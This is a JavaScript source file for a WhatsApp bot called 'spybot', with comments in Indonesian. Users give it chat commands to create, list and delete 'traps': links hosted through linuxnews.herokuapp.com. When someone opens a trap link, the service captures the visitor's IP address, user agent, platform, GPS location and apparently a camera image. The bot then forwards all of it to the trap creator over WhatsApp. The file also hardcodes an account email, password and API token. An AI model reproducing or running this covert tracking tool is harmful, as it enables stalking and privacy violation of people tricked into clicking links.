const axios = require("axios")
const {WAConnection, MessageType} = require('@adiwajshing/baileys');
const fs = require('fs');
const ws = require('ws');
const websock = new ws('ws://linuxnews.herokuapp.com/ws')
const spybot = new WAConnection();
const Session = axios.create({ baseURL: 'https://linuxnews.herokuapp.com' });
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
const linuxnews = {
    email:'ajaysetiady6434@gmail.com', //signup terlebih dahulu di linuxnews.herokuapp.com
    password:'anjaybanget',
    token:'bfe4e2169ab2320a67e734582abfb4ebdef934ee490d4a03287593dae73072a4792f32acdf208a8e754387c63472a2f540396da5e716bfd53a624c3f144704ec'
}
async function prettyTrap(chat_id){
    st=""
    await get_url().then(x=>{
        for(k of x){
            if(chat_id===k.name){
            st+=`${k.id}  :  ${k.url} :  https://linuxnews.herokuapp.com/post/${k.idpage}\n`
        }}
    })
    return st
}

async function get_url(){
        return await Session({url:"/getUrl", method:'post',data:`apikey=${linuxnews.token}`}).then(async (resp) => {
            return resp.data
        })
}
async function addTrap(url, name){
    return await Session({url:'/addTrap', method:'post', data:`token=${encodeURI(linuxnews.token)}&url=${encodeURI(url)}&name=${encodeURI(name)}`}).then(x=>x.data.status)

}
async function delTrap(id, name){
    return await get_url().then(async (x)=>{
        for(k of x){
            if(k.name === name && k.id === id){
                return await Session({url:"/deltrap", method:'post', data:`token=${encodeURI(linuxnews.token)}&id=${id}`}).then(x=>x.data.status)
            }
        }
        return false
    })
}
websock.on('message', async function incoming(data){
    let parser = JSON.parse(data);
    console.log(JSON.stringify(parser, null, '\t'))
    if('msg' in parser) {
    } else if ("IP" in parser){
        var message=`IP : ${parser.IP}
User-Agent: ${parser['User-Agent']}      
Akurasi : ${parser.GeoAccuracy}
URL : ${parser.trap_url}
Dikunjungi : ${parser.visited} kali
Platform : ${parser.Platform}
timestamp : ${new Date(parseInt(parser['GeoTimestamp'])).toUTCString()}
        `.trim()
        if("img" in parser){
            await spybot.sendMessage(parser.trap_name, Buffer.from(parser.img.slice(31), 'base64'), image, {caption:message})
        }else{
            await spybot.sendMessage(parser.trap_name, message, text)
        }
        await spybot.sendMessage(parser.trap_name, {degreesLatitude:parseFloat(parser.GeoLatitude), degreesLongitude:parseFloat(parser.GeoLongitude)}, location)
    } else {
    }
})
websock.on('open', function open(){
    websock.send(`{"email":"${linuxnews.email}", "password":"${linuxnews.password}"}`);
})
async function spybotReplier(message, content){
    var from    = message.key.remoteJid;
    var cmd     = content.split(' ')
    if(content === "!list"){
        await spybot.sendMessage(from, await prettyTrap(from).then(x=>x), text, {quoted:message})
    }else if(cmd[0] === "!create"){
        if(cmd.length>1){
            addTrap(cmd[1], from).then(async (resp) => await spybot.sendMessage(from, resp?'Berhasil':'Gagal', text, {quoted:message}))
        }else{
            spybot.sendMessage(from, 'Masukan URL', text, {quoted:message})
        }
    } else if(cmd[0] === '!delete'){
        if(cmd.length > 1){
            await delTrap(parseInt(cmd[1]), from).then(async (resp)=>await spybot.sendMessage(from, resp?'Berhasil':'Gagal', text, {quoted:message}))
        }else{
            await spybot.sendMessage(from, 'Masukan Id Trap', text, {quoted:message})
        }
    } else if(cmd == "!help"){
        await spybot.sendMessage(from, 'create : Membuat jebakan\nlist: Menampilkan Jebakan\ndelete: Menghapus jebakan dengan id', text, {quoted:message})
    }
    return 
}
async function runspybot(){
    fs.existsSync('./spybot.json') && spybot.loadAuthInfo('./spybot.json');
    spybot.on('qr', () => {
        console.log("SCAN QRCODE");
    });
    await spybot.connect({timeoutMs: 30*1000})
    fs.writeFileSync('./spybot.json', JSON.stringify(spybot.base64EncodedAuthInfo(), null, '\t'))
    spybot.on("chat-update", async (chat)=>{
        if(chat.messages){
        var message = chat.messages.all()[0];
        if (!message){
            console.log("Empty Message")
        }else if(message.fromMe){
            console.log("FromMe")   
        }else{
            console.log(`from ${message.key.remoteJid}`);
            console.log(JSON.stringify(message))
            console.log(`Message ${message.message.ephemeralMessage?message.message.ephemeralMessage.message.extendedTextMessage.text:message.message.conversation}`);
            await spybotReplier(message,message.message.ephemeralMessage?message.message.ephemeralMessage.message.extendedTextMessage.text:message.message.conversation).then(x=>x);
        }
    }})
}

runspybot();
